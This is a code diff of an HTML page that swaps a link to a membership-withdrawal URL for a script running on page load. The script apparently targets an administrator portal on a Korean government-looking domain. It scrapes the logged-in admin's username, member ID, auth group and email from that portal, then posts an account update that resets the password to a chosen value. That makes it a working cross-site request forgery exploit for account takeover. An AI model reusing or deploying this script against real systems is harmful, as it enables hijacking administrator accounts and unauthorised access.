@@ -1,5 +1,50 @@
 <html>
 <body>
-<a href="https://apms.epis.or.kr/home/kor/mylearn/info/out.act?menuPos=10">회원탈퇴</a>
+<script>
+var url_1 = 'https://admin.greendaero.go.kr/home/adminNotice/adminNoticeList.do';
+
+fetch(url_1)
+.then(res => res.text())
+.then(html => {
+	const parser = new DOMParser();
+	const doc = parser.parseFromString(html, 'text/html');
+	const uNameElement = doc.querySelector('.links b');
+	const uName = uNameElement.textContent.trim();
+
+	const url_2 = `https://admin.greendaero.go.kr/sys/code/administratorAccountDtid.do?optaUseId=${uName}`;
+	
+	return fetch(url_2);
+})
+.then(res => res.text())
+.then(html => {
+	const parser = new DOMParser();
+	const doc = parser.parseFromString(html, 'text/html');
+	const uNameElement = doc.querySelector('.links b');
+	const uName = uNameElement.textContent.trim();
+	
+	const url_3 = 'https://admin.greendaero.go.kr/sys/code/accountUpdate.do';
+	const E_mbrId = doc.querySelector('input[name="mbrId"]').value;
+	const E_authGrp = doc.getElementById('authGrp').options[(doc.getElementById('authGrp').selectedIndex)].value
+	const E_optaUserId = doc.querySelector('input[name="optaUserId"]').value;
+	const E_emlAddr = doc.querySelector('input[name="emlAddr"]').value;
+	
+	//원하는 비밀번호 할당!
+	const picPswd = 'Test123!';
+
+	const E_body = "m1=&m2=&pt1=&pt2=&pt3=&mt1=&mt2=&mt3=&useYn=Y&optaUserUseSttsCd=P&mbrId="+`${E_mbrId}`+"&authGrp="+`${E_authGrp}`+"&optaUserId="+`${E_optaUserId}`+"&picPswd="+`${picPswd}`+"&userNm="+`${uName}`+"&emlAddr="+`${E_emlAddr}`;
+	console.log(E_body);
+	
+	return fetch(url_3,{
+		method: "POST",
+		body: E_body,
+		headers: {
+			"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+		}
+	});
+}).then(response => console.log(response)
+)
+.catch(error => console.error('데이터 가져오기 실패:', error));
+
+</script>
 </body>
 </html>
